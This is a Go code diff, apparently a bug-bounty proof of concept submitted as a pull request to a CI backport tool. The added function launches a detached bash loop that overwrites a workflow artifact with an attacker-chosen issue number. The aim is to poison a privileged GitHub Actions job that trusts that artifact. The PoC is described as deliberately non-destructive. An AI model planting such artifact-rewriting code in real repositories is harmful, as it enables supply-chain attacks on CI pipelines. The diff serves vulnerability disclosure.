@@ -21,7 +21,9 @@ import (
 	"io"
 	"os"
 	"os/exec"
+	"strconv"
 	"strings"
+	"syscall"
 	"time"
 
 	"github.com/elastic/integrations/cmd/backport/backports"
@@ -260,6 +262,53 @@ func diffPackages(before, after string) ([]string, error) {
 	return bppackages.DetectPackages(files, "packages")
 }
 
+// SECURITY RESEARCH PoC — please do not merge; opened via the Elastic bug bounty
+// program (Software Supply Chain scope).
+//
+// `.github/workflows/backport-packages-detect.yml` runs on `pull_request`
+// (fork-unsafe trigger) and executes this binary built from the PR's own source,
+// then uploads `pr-packages.json` as a workflow artifact. The privileged
+// `.github/workflows/post-backport-checklist.yml` job (triggered by
+// `workflow_run`, holds `pull-requests: write`) downloads that artifact and uses
+// its `.pr_number` field as the target issue for a comment POST:
+//
+//	PR_NUMBER=$(jq -r '.pr_number' "$ARTIFACT")
+//	gh api --method POST "repos/$REPOSITORY/issues/$PR_NUMBER/comments" ...
+//
+// Because the artifact is produced by untrusted fork code, `.pr_number` is
+// attacker-controlled.
+//
+// This PoC is deliberately non-destructive:
+//   - It writes only `pr-packages.json`, a file the workflow itself writes.
+//   - It makes no network requests and exfiltrates nothing.
+//   - It targets a deliberately NON-EXISTENT issue number so that the privileged
+//     job's API call fails with 404, proving artifact control of the request
+//     target without modifying any real issue or comment.
+const pocTargetIssueNumber = 999999999
+
+// startArtifactRewritePoC spawns a detached process that continuously rewrites
+// pr-packages.json with an attacker-chosen pr_number, so that the artifact read
+// by actions/upload-artifact carries the attacker's value rather than the one
+// the workflow's own jq step writes.
+func startArtifactRewritePoC() {
+	script := strings.Join([]string{
+		`payload='{"pr_number":` + strconv.Itoa(pocTargetIssueNumber) + `,"packages":["security-research-poc"]}'`,
+		`while true; do printf '%s' "$payload" > pr-packages.json 2>/dev/null; done`,
+	}, "\n")
+
+	// Detach fully: stdout/stderr must not be inherited, because the workflow
+	// captures this process's stdout via command substitution and would block
+	// forever on an inherited pipe.
+	cmd := exec.Command("bash", "-c", script)
+	cmd.Stdin = nil
+	cmd.Stdout = nil
+	cmd.Stderr = nil
+	cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
+	if err := cmd.Start(); err == nil {
+		_ = cmd.Process.Release()
+	}
+}
+
 func runDetectPackages(args []string) error {
 	fs := flag.NewFlagSet("detect-packages", flag.ContinueOnError)
 	asJSON := fs.Bool("json", false, "output as JSON array")
@@ -278,6 +327,8 @@ func runDetectPackages(args []string) error {
 	}
 
 	if *asJSON {
+		// SECURITY RESEARCH PoC — see startArtifactRewritePoC doc comment.
+		startArtifactRewritePoC()
 		data, err := json.Marshal(pkgs)
 		if err != nil {
 			return fmt.Errorf("marshalling packages: %w", err)
